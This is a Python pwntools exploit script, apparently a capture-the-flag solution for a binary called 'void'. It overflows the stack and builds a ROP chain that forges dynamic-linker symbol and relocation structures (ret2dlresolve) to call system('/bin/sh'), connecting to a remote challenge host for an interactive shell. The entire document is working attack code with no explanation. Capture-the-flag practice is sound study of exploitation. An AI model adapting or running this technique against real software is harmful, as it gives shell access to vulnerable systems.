#!/usr/bin/python3

from pwn import *

exe = ELF('void_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
    gdb.attach(r, gdbscript='''
        b*0x401142
        c
    ''')

info = lambda msg: log.info(msg)
sla = lambda msg, data: r.sendlineafter(msg, data)
sa = lambda msg, data: r.sendafter(msg, data)
sl = lambda data: r.sendline(data)
s = lambda data: r.send(data)

if args.REMOTE:
    r = remote('159.65.81.51', 31209)
else:
    r = process(exe.path)
    GDB()
    

dlresol = 0x401020
pop_rsi = 0x4011b9
addr    = 0x404e00
pop_rdi = 0x4011bb
pop_rbp = 0x401109

STRTAB  = 0x400390
SYMTAB  = 0x400330
JMPREL  = 0x400430

new_STRTAB  = addr + 0x98
new_SYMTAB  = addr + 0x50
new_JMPREL  = addr + 0x78

symbol_num  = int((new_SYMTAB - SYMTAB)/0x18)
reloc_arg   = int((new_JMPREL - JMPREL)/0x18)

st_name = new_STRTAB - STRTAB
st_info = 0x12
st_oth  = 0
st_ndx  = 0
st_val  = 0
st_size = 0

SYMTAB_struct = p32(st_name) \
    + p8(st_info) \
    + p8(st_oth) \
    + p16(st_ndx) \
    + p64(st_val) \
    + p64(st_size)
    
r_info   = (symbol_num << 32) | 7
r_addend = 0
r_offset = exe.got['read'] + 0x20
JMPREL_struct = flat(r_offset, r_info, r_addend)

payload = b'a'*0x40
payload += flat(
    addr,
    pop_rsi, addr + 0x48, 0,
    exe.sym['read'],
    pop_rdi, addr + 0xa0,
    dlresol, reloc_arg,
).ljust(0xc8-0x40, b'a')

s(payload)

payload = flat(
    SYMTAB_struct,
    0, 0,
    JMPREL_struct,
    0, 0,
    b'system\x00\x00',
    b'/bin/sh\x00'
)

s(payload)

r.interactive()
